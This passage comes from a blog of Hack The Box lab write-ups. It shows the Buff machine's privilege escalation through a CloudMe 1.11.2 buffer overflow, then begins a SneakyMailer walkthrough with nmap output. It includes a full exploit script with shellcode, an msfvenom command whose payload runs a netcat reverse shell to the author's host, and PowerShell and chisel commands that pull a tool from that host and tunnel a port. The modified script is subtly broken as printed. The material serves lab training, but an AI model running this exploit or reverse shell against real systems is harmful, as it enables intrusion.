<p>In the Download folder, there is an executable file called <code>CloudMe_1112.exe</code> where 1112 is likely a version number.</p>
<p>Checking on currently running services with <code>netstat</code> discovers.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">C:\xampp\htdocs\gym\upload&gt; netstat -aonp tcp
Active Connections

  Proto  Local Address          Foreign Address        State           PID

...&lt;SNIP&gt;...
  TCP    127.0.0.1:8888            0.0.0.0:0              LISTENING       7352
...&lt;SNIP&gt;...  
</code></pre></div><p>I can search the program name using the <code>tasklist</code> command.</p>
<pre><code>C:\xampp\htdocs\gym\upload&gt; tasklist /FI “PID eq 7352&quot; /v /FO list
</code></pre><p><img src="imgs/image-20210502160832477.png" alt="image-20210502160832477" style="zoom:67%;" /></p>
<p>So PID 7352 on port 8888 is running <code>CloudMe.exe</code>.</p>
<p>Because the user name field is showing as <strong>N/A</strong>, one possible thing is that I don’t have enough privilege to dig for more information about the process because it might be running with a higher privilege (either administrator or a local system).</p>
<h4 id="searchsploit-1">Searchsploit</h4>
<p>A quick search about &ldquo;CloudMe&rdquo; on <code>searchsploit</code> pops several buffer overflow exploits with four of them are exact match.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «buff» «10.10.14.18»
$ searchsploit CloudMe
------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                 <span class="p">|</span>  Path
------------------------------------------------------------------------------- ---------------------------------
CloudMe 1.11.2 - Buffer Overflow <span class="o">(</span>PoC<span class="o">)</span>                                         <span class="p">|</span> windows/remote/48389.py
CloudMe 1.11.2 - Buffer Overflow <span class="o">(</span>SEH_DEP_ASLR<span class="o">)</span>                                <span class="p">|</span> windows/local/48499.txt
CloudMe 1.11.2 - Buffer Overflow ROP <span class="o">(</span>DEP_ASLR<span class="o">)</span>                                <span class="p">|</span> windows/local/48840.py
Cloudme 1.9 - Buffer Overflow <span class="o">(</span>DEP<span class="o">)</span> <span class="o">(</span>Metasploit<span class="o">)</span>                               <span class="p">|</span> windows_x86-64/remote/45197.rb
CloudMe Sync 1.10.9 - Buffer Overflow <span class="o">(</span>SEH<span class="o">)(</span>DEP Bypass<span class="o">)</span>                        <span class="p">|</span> windows_x86-64/local/45159.py
CloudMe Sync 1.10.9 - Stack-Based Buffer Overflow <span class="o">(</span>Metasploit<span class="o">)</span>                 <span class="p">|</span> windows/remote/44175.rb
CloudMe Sync 1.11.0 - Local Buffer Overflow                                    <span class="p">|</span> windows/local/44470.py
CloudMe Sync 1.11.2 - Buffer Overflow + Egghunt                                <span class="p">|</span> windows/remote/46218.py
CloudMe Sync 1.11.2 Buffer Overflow - WoW64 <span class="o">(</span>DEP Bypass<span class="o">)</span>                       <span class="p">|</span> windows_x86-64/remote/46250.py
CloudMe Sync &lt; 1.11.0 - Buffer Overflow                                        <span class="p">|</span> windows/remote/44027.py
CloudMe Sync &lt; 1.11.0 - Buffer Overflow <span class="o">(</span>SEH<span class="o">)</span> <span class="o">(</span>DEP Bypass<span class="o">)</span>                     <span class="p">|</span> windows_x86-64/remote/44784.py
------------------------------------------------------------------------------- ---------------------------------
</code></pre></div><h4 id="tunneling">Tunneling</h4>
<p>The CloudMe program is currently listening on localhost (bound), so to interact with it, I&rsquo;ll have to setup a tunnel/port forwarding. For this, I&rsquo;ll use <code>chisel</code> (<a href="https://github.com/jpillora/chisel/releases)">https://github.com/jpillora/chisel/releases)</a>.</p>
<blockquote>
<p>Example usage of chisel is explained better in this blog :</p>
<ul>
<li><a href="https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html#chisel">https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html#chisel</a></li>
</ul>
</blockquote>
<p>First, I&rsquo;ll transfer the Windows version of chisel to Buff via PowerShell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">shaun</span><span class="p">\</span><span class="n">Download</span><span class="p">&gt;</span> <span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="s2">&#34;invoke-webrequest -uri http://10.10.14.18/chisel.exe -outfile cs.exe&#34;</span>
</code></pre></div><p>Second, I&rsquo;ll setup a chisel server on my Kali.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «buff» «10.10.14.18»
$ chisel server -p <span class="m">9002</span>
2020/08/14 13:22:18 server: Fingerprint 35:fe:d3:dd:6c:b3:63:35:87:6a:f2:70:52:f1:82:e2
2020/08/14 13:22:18 server: Listening on 0.0.0.0:9002...
</code></pre></div><p>On Buff, I&rsquo;ll connect as client to my chisel server on Kali.</p>
<pre><code>C:\Users\shaun\Download&gt; .\cs.exe client 10.10.14.18:9002 R:8888:127.0.0.1:8888
</code></pre><p><img src="imgs/image-20210502162654346.png" alt="image-20210502162654346" style="zoom:67%;" /></p>
<p>This, will forward the traffics that sent from my Kali Linux on port 8888 to Buff&rsquo;s localhost on port 8888.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">Kali localhost:8888 &lt;-&gt; (Kali 10.10.14.18:9002 &lt;-&gt; Buff:10.10.10.198:XXX) &lt;-&gt; Buff localhost:8888
</code></pre></div><h4 id="exploitation-cloudme-1112">Exploitation CloudMe 1.11.2</h4>
<p>I&rsquo;ll use this exploit PoC (I&rsquo;ve renamed it to <code>bofexploit.py</code>) but I&rsquo;ll have to modify the payload with my own.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="c1"># Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)</span>
<span class="c1"># Date: 2020-04-27</span>
<span class="c1"># Exploit Author: Andy Bowden</span>
<span class="c1"># Vendor Homepage: https://www.cloudme.com/en</span>
<span class="c1"># Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe</span>
<span class="c1"># Version: CloudMe 1.11.2</span>
<span class="c1"># Tested on: Windows 10 x86</span>

<span class="c1">#Instructions:</span>
<span class="c1"># Start the CloudMe service and run the script.</span>

<span class="kn">import</span> <span class="nn">socket</span>

<span class="n">target</span> <span class="o">=</span> <span class="s2">&#34;127.0.0.1&#34;</span>

<span class="n">padding1</span>   <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="mi">1052</span>
<span class="n">EIP</span>        <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xB5\x42\xA8\x68</span><span class="s2">&#34;</span> <span class="c1"># 0x68A842B5 -&gt; PUSH ESP, RET</span>
<span class="n">NOPS</span>       <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="mi">30</span>

<span class="c1">#msfvenom -a x86 -p windows/exec CMD=calc.exe -b &#39;\x00\x0A\x0D&#39; -f python</span>
<span class="n">payload</span>    <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xba\xad\x1e\x7c\x02\xdb\xcf\xd9\x74\x24\xf4\x5e\x33</span><span class="s2">&#34;</span>
<span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xc9\xb1\x31\x83\xc6\x04\x31\x56\x0f\x03\x56\xa2\xfc</span><span class="s2">&#34;</span>
<span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x89\xfe\x54\x82\x72\xff\xa4\xe3\xfb\x1a\x95\x23\x9f</span><span class="s2">&#34;</span>
<span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x6f\x85\x93\xeb\x22\x29\x5f\xb9\xd6\xba\x2d\x16\xd8</span><span class="s2">&#34;</span>
<span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x0b\x9b\x40\xd7\x8c\xb0\xb1\x76\x0e\xcb\xe5\x58\x2f</span><span class="s2">&#34;</span>
<span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x04\xf8\x99\x68\x79\xf1\xc8\x21\xf5\xa4\xfc\x46\x43</span><span class="s2">&#34;</span>
<span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x75\x76\x14\x45\xfd\x6b\xec\x64\x2c\x3a\x67\x3f\xee</span><span class="s2">&#34;</span>
<span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xbc\xa4\x4b\xa7\xa6\xa9\x76\x71\x5c\x19\x0c\x80\xb4</span><span class="s2">&#34;</span>
<span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x50\xed\x2f\xf9\x5d\x1c\x31\x3d\x59\xff\x44\x37\x9a</span><span class="s2">&#34;</span>
<span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x82\x5e\x8c\xe1\x58\xea\x17\x41\x2a\x4c\xfc\x70\xff</span><span class="s2">&#34;</span>
<span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x0b\x77\x7e\xb4\x58\xdf\x62\x4b\x8c\x6b\x9e\xc0\x33</span><span class="s2">&#34;</span>
<span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xbc\x17\x92\x17\x18\x7c\x40\x39\x39\xd8\x27\x46\x59</span><span class="s2">&#34;</span>
<span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x83\x98\xe2\x11\x29\xcc\x9e\x7b\x27\x13\x2c\x06\x05</span><span class="s2">&#34;</span>
<span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x13\x2e\x09\x39\x7c\x1f\x82\xd6\xfb\xa0\x41\x93\xf4</span><span class="s2">&#34;</span>
<span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xea\xc8\xb5\x9c\xb2\x98\x84\xc0\x44\x77\xca\xfc\xc6</span><span class="s2">&#34;</span>
<span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x72\xb2\xfa\xd7\xf6\xb7\x47\x50\xea\xc5\xd8\x35\x0c</span><span class="s2">&#34;</span>
<span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x7a\xd8\x1f\x6f\x1d\x4a\xc3\x5e\xb8\xea\x66\x9f</span><span class="s2">&#34;</span>

<span class="n">overrun</span>    <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;C&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1500</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">padding1</span> <span class="o">+</span> <span class="n">NOPS</span> <span class="o">+</span> <span class="n">EIP</span> <span class="o">+</span> <span class="n">payload</span><span class="p">))</span>

<span class="n">buf</span> <span class="o">=</span> <span class="n">padding1</span> <span class="o">+</span> <span class="n">EIP</span> <span class="o">+</span> <span class="n">NOPS</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">overrun</span>

<span class="k">try</span><span class="p">:</span>
        <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
        <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target</span><span class="p">,</span><span class="mi">8888</span><span class="p">))</span>
        <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
<span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">exc_value</span><span class="p">)</span>
</code></pre></div><p>To generate new payload, I&rsquo;ll follow the instruction on the PoC code which is using <code>msfvenom</code>. But, instead of running <code>calc.exe</code>, I&rsquo;ll change it to execute the netcat I&rsquo;ve uploaded before during upgrading the <code>shaun</code> shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">→ root@kali «buff» «10.10.14.18»
$ msfvenom -p windows/exec CMD=&#39;C:\xampp\htdocs\gym\upload\nc.exe -e cmd.exe 10.10.14.18 9005&#39; -b &#39;\x00\x0A\x0D&#39; -f python -v payload

...&lt;SNIP&gt;...
payload += b&#34;\xbe\xd0\xe7\xa9\x73\xd9\xc7\xd9\x74\x24\xf4\x5f&#34;
payload += b&#34;\x31\xc9\xb1\x3e\x31\x77\x12\x03\x77\x12\x83\x17&#34;
payload += b&#34;\xe3\x4b\x86\x6b\x04\x09\x69\x93\xd5\x6e\xe3\x76&#34;
payload += b&#34;\xe4\xae\x97\xf3\x57\x1f\xd3\x51\x54\xd4\xb1\x41&#34;
payload += b&#34;\xef\x98\x1d\x66\x58\x16\x78\x49\x59\x0b\xb8\xc8&#34;
payload += b&#34;\xd9\x56\xed\x2a\xe3\x98\xe0\x2b\x24\xc4\x09\x79&#34;
payload += b&#34;\xfd\x82\xbc\x6d\x8a\xdf\x7c\x06\xc0\xce\x04\xfb&#34;
payload += b&#34;\x91\xf1\x25\xaa\xaa\xab\xe5\x4d\x7e\xc0\xaf\x55&#34;
payload += b&#34;\x63\xed\x66\xee\x57\x99\x78\x26\xa6\x62\xd6\x07&#34;
payload += b&#34;\x06\x91\x26\x40\xa1\x4a\x5d\xb8\xd1\xf7\x66\x7f&#34;
payload += b&#34;\xab\x23\xe2\x9b\x0b\xa7\x54\x47\xad\x64\x02\x0c&#34;
payload += b&#34;\xa1\xc1\x40\x4a\xa6\xd4\x85\xe1\xd2\x5d\x28\x25&#34;
payload += b&#34;\x53\x25\x0f\xe1\x3f\xfd\x2e\xb0\xe5\x50\x4e\xa2&#34;
payload += b&#34;\x45\x0c\xea\xa9\x68\x59\x87\xf0\xe6\x9c\x15\x8f&#34;
payload += b&#34;\x45\x9e\x25\x8f\xf9\xf7\x14\x04\x96\x80\xa8\xcf&#34;
payload += b&#34;\xd2\x7f\xe3\x4d\x72\xe8\xaa\x04\xc6\x75\x4d\xf3&#34;
payload += b&#34;\x05\x80\xce\xf1\xf5\x77\xce\x70\xf3\x3c\x48\x69&#34;
payload += b&#34;\x89\x2d\x3d\x8d\x3e\x4d\x14\xce\xfa\xed\xe2\xa3&#34;
payload += b&#34;\x9f\x7f\x7e\x1f\x13\xe8\xe1\xea\xbd\xb4\x85\x7b&#34;
payload += b&#34;\x35\x2b\x2a\xec\xd8\xd7\xc1\xae\x74\x7b\x08\x2b&#34;
payload += b&#34;\xf1\x1e\x74\x9e\x64\xc1\x17\x8d\x02\x2f\xbd\x35&#34;
payload += b&#34;\xae\x0f\x0c\xf5\x1e\x61\x5e\xdb\x6f\xb5\xb0\x16&#34;
payload += b&#34;\xa4\x95\xf5\x68\xf4\xe0\x05&#34;
</code></pre></div><p>After removed the comments and changed the payload, the <code>bofexploit.py</code> now look like this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">socket</span>

<span class="n">target</span> <span class="o">=</span> <span class="s2">&#34;127.0.0.1&#34;</span>
<span class="n">padding1</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="mi">1052</span>
<span class="n">EIP</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xB5\x42\xA8\x68</span><span class="s2">&#34;</span> <span class="c1"># 0x68A842B5 -&gt; PUSH ESP, RET</span>
<span class="n">NOPS</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="mi">30</span>

<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xbe\xd0\xe7\xa9\x73\xd9\xc7\xd9\x74\x24\xf4\x5f</span><span class="s2">&#34;</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x31\xc9\xb1\x3e\x31\x77\x12\x03\x77\x12\x83\x17</span><span class="s2">&#34;</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xe3\x4b\x86\x6b\x04\x09\x69\x93\xd5\x6e\xe3\x76</span><span class="s2">&#34;</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xe4\xae\x97\xf3\x57\x1f\xd3\x51\x54\xd4\xb1\x41</span><span class="s2">&#34;</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xef\x98\x1d\x66\x58\x16\x78\x49\x59\x0b\xb8\xc8</span><span class="s2">&#34;</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xd9\x56\xed\x2a\xe3\x98\xe0\x2b\x24\xc4\x09\x79</span><span class="s2">&#34;</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xfd\x82\xbc\x6d\x8a\xdf\x7c\x06\xc0\xce\x04\xfb</span><span class="s2">&#34;</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x91\xf1\x25\xaa\xaa\xab\xe5\x4d\x7e\xc0\xaf\x55</span><span class="s2">&#34;</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x63\xed\x66\xee\x57\x99\x78\x26\xa6\x62\xd6\x07</span><span class="s2">&#34;</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x06\x91\x26\x40\xa1\x4a\x5d\xb8\xd1\xf7\x66\x7f</span><span class="s2">&#34;</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xab\x23\xe2\x9b\x0b\xa7\x54\x47\xad\x64\x02\x0c</span><span class="s2">&#34;</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xa1\xc1\x40\x4a\xa6\xd4\x85\xe1\xd2\x5d\x28\x25</span><span class="s2">&#34;</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x53\x25\x0f\xe1\x3f\xfd\x2e\xb0\xe5\x50\x4e\xa2</span><span class="s2">&#34;</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x45\x0c\xea\xa9\x68\x59\x87\xf0\xe6\x9c\x15\x8f</span><span class="s2">&#34;</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x45\x9e\x25\x8f\xf9\xf7\x14\x04\x96\x80\xa8\xcf</span><span class="s2">&#34;</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xd2\x7f\xe3\x4d\x72\xe8\xaa\x04\xc6\x75\x4d\xf3</span><span class="s2">&#34;</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x05\x80\xce\xf1\xf5\x77\xce\x70\xf3\x3c\x48\x69</span><span class="s2">&#34;</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x89\x2d\x3d\x8d\x3e\x4d\x14\xce\xfa\xed\xe2\xa3</span><span class="s2">&#34;</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x9f\x7f\x7e\x1f\x13\xe8\xe1\xea\xbd\xb4\x85\x7b</span><span class="s2">&#34;</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x35\x2b\x2a\xec\xd8\xd7\xc1\xae\x74\x7b\x08\x2b</span><span class="s2">&#34;</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xf1\x1e\x74\x9e\x64\xc1\x17\x8d\x02\x2f\xbd\x35</span><span class="s2">&#34;</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xae\x0f\x0c\xf5\x1e\x61\x5e\xdb\x6f\xb5\xb0\x16</span><span class="s2">&#34;</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xa4\x95\xf5\x68\xf4\xe0\x05</span><span class="s2">&#34;</span>

<span class="n">overrun</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;C&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1500</span> <span class="err">—</span> <span class="nb">len</span><span class="p">(</span><span class="n">padding1</span> <span class="o">+</span> <span class="n">NOPS</span> <span class="o">+</span> <span class="n">EIP</span> <span class="o">+</span> <span class="n">payload</span><span class="p">))</span>
<span class="n">buf</span> <span class="o">=</span> <span class="n">padding1</span> <span class="o">+</span> <span class="n">EIP</span> <span class="o">+</span> <span class="n">NOPS</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">overrun</span>

<span class="k">try</span><span class="p">:</span>
 <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
 <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target</span><span class="p">,</span><span class="mi">8888</span><span class="p">))</span>
 <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
<span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
 <span class="nb">print</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">exc_value</span><span class="p">)</span>
</code></pre></div><p>The exploit is ready, and now I’ll setup a listener on the same port with the one I’ve assigned to the payload and run the exploit afterwards.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «buff» «10.10.14.18»
$ python2 bofexploit.py
</code></pre></div><p>On my listener:</p>
<p><img src="imgs/image-20210502164625103.png" alt="image-20210502164625103" style="zoom:67%;" /></p>
<p>Now I can grab the root flag or dump the hashes.</p>
<hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html">https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html</a></li>
<li><a href="https://bufferoverflows.net/practical-exploitation-part-1-cloudme-sync-1-11-2-bufferoverflow-seh/">https://bufferoverflows.net/practical-exploitation-part-1-cloudme-sync-1-11-2-bufferoverflow-seh/</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - SneakyMailer</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-sneakymailer/</link>
      <pubDate>Wed, 28 Apr 2021 21:28:30 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-sneakymailer/</guid>
      <description>You&amp;#39;ve got mail!</description>
      <content:encoded><![CDATA[<p>SneakyMailer is a medium difficulty Linux machine from Hack The Box. It starts by obtaining credentials through phishing attack. The credentials allows me to access one of the users' mailboxes and obtain an FTP account. Foothold on the system can be gained after dropping a reverse shell on the FTP. Internal enumeration discovers a PyPI server that can be exploited to escalate myself to user by uploading a malicious package. The user is allowed to run <code>pip3</code> with sudo privileges, and this can be leveraged to obtain root access.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Phishing</li>
<li>PyPI Package Exploitation</li>
<li>Exploiting sudo privileges on pip3</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@iamf «sneakymailer» «10.10.14.42» 
$ mkdir nmap<span class="p">;</span> nmap -sC -sV -oN nmap/inital-sneaky 10.10.10.197 -v

PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
<span class="p">|</span> ssh-hostkey:
<span class="p">|</span>   <span class="m">2048</span> 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd <span class="o">(</span>RSA<span class="o">)</span>
<span class="p">|</span>   <span class="m">256</span> d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 <span class="o">(</span>ECDSA<span class="o">)</span>
<span class="p">|</span>_  <span class="m">256</span> 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a <span class="o">(</span>ED25519<span class="o">)</span>
25/tcp   open  smtp     Postfix smtpd
<span class="p">|</span>_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING,
80/tcp   open  http     nginx 1.14.2
<span class="p">|</span>_http-server-header: nginx/1.14.2
<span class="p">|</span>_http-title: Did not follow redirect to http://sneakycorp.htb
143/tcp  open  imap     Courier Imapd <span class="o">(</span>released 2018<span class="o">)</span>
<span class="p">|</span>_imap-capabilities: ENABLE STARTTLS <span class="nv">UTF8</span><span class="o">=</span>ACCEPTA0001 CHILDREN ACL <span class="nv">ACL2</span><span class="o">=</span>UNION <span class="nv">THREAD</span><span class="o">=</span>ORDEREDSUBJECT <span class="nv">THREAD</span><span class="o">=</span>REFERENCES UIDPLUS OK SORT QUOTA IDLE completed CAPABILITY IMAP4rev1 NAMESPACE
<span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>localhost/organizationName<span class="o">=</span>Courier Mail Server/stateOrProvinceName<span class="o">=</span>NY/countryName<span class="o">=</span>US
<span class="p">|</span> Subject Alternative Name: email:postmaster@example.com
<span class="p">|</span> Not valid before: 2020-05-14T17:14:21
<span class="p">|</span>_Not valid after:  2021-05-14T17:14:21
<span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
993/tcp  open  ssl/imap Courier Imapd <span class="o">(</span>released 2018<span class="o">)</span>
<span class="p">|</span>_imap-capabilities: ENABLE <span class="nv">AUTH</span><span class="o">=</span>PLAIN CHILDREN ACL <span class="nv">ACL2</span><span class="o">=</span>UNION <span class="nv">THREAD</span><span class="o">=</span>ORDEREDSUBJECT <span class="nv">THREAD</span><span class="o">=</span>REFERENCES UIDPLUS OK SORT QUOTA completed IDLE IMAP4rev1 CAPABILITY <span class="nv">UTF8</span><span class="o">=</span>ACCEPTA0001 NAMESPACE
<span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>localhost/organizationName<span class="o">=</span>Courier Mail Server/stateOrProvinceName<span class="o">=</span>NY/countryName<span class="o">=</span>US
<span class="p">|</span> Subject Alternative Name: email:postmaster@example.com
<span class="p">|</span> Not valid before: 2020-05-14T17:14:21
<span class="p">|</span>_Not valid after:  2021-05-14T17:14:21
<span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
8080/tcp open  http     nginx 1.14.2
<span class="p">|</span>_http-open-proxy: Proxy might be redirecting requests
<span class="p">|</span>_http-server-header: nginx/1.14.2
<span class="p">|</span>_http-title: Welcome to nginx!
Service Info: Host:  debian<span class="p">;</span> OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</code></pre></div><p>With an initial scan, <code>nmap</code> discovered seven ports open and also identified the services behind them.</p>
<p>I’ll summarize the result:</p>
<ul>
<li>There is an FTP service on port 21, but <code>nmap</code> shows no sign that anonymous login is allowed.</li>
<li>An SSH service on port 22</li>
<li>Three email protocols, SMTP on port 25, IMAP on port 143 and secure IMAP on port 993</li>
<li>And a web server hosting two sites on port 80 and 8080. <code>nmap</code> identifies the hostname as <code>sneakycorp.htb</code>.</li>
</ul>
<p>I’ll add <code>sneakycorp.htb</code> to my <code>/etc/hosts</code> file:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@iamf «sneakymailer» «10.10.14.42» 
$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.197 sneakycorp.htb&#39;</span> &gt;&gt; /etc/hosts 
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Visiting <code>sneakycorp.htb</code> on port 80 displays a project dashboard for a company called SneakyCorp. One project is marked as &ldquo;Complete!&rdquo; while the other one seems still in progress for about 80%.</p>
